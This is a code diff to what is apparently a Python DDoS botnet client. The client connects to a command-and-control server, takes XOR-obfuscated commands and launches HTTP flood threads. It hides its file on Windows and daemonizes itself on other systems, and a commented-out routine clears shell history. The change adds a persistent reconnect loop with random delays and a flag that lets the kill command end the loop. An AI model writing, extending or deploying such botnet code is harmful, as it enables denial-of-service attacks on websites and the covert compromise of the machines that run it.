@@ -63,7 +63,8 @@ acceptall = [
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
 
-stop = False#threads control
+stop    = False#threads control
+breaker = False#reconnect control
 def HTTP(ip, port, path):
 	global stop
 	while True:
@@ -210,6 +211,9 @@ def handle(sock):
 					attack = 0#clear attack list
 				elif command[0] == xor_dec('QBgNCgs=',key):#!kill : kill bot
 					sock.close()
+					global breaker
+					breaker = True
+					exit()
 					break
 			except:#if have error than will pass
 				pass
@@ -245,6 +249,7 @@ def clean_device():
 	os.system("history -c")
 '''
 def conn():
+	global breaker
 	if len(sys.argv) == 1:#i use 'python client.py debug' to check command
 		if os.name != "nt":
 			daemon()#can't use in windows
@@ -252,23 +257,24 @@ def conn():
 			#clean_device()
 		else:
 			os.system("attrib +s +a +h "+sys.argv[0])#hide the file 
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-		s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-		#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
-		#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
-		#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
-		s.connect((cnc,cport))
+	while True:#magic loop
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+			s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
+			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
+			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
+			s.connect((cnc,cport))
 
-		handle(s)
+			handle(s)
 
-	except Exception as e:
-		connect()#magic loop
+		except:
+			if breaker:
+				break
+			time.sleep(random.randint(1,60))
+			pass
 
-def connect():
-	time.sleep(5)
-	conn()
 #xor enc part#
 def xor_enc(string,key):
 	lkey=len(key)
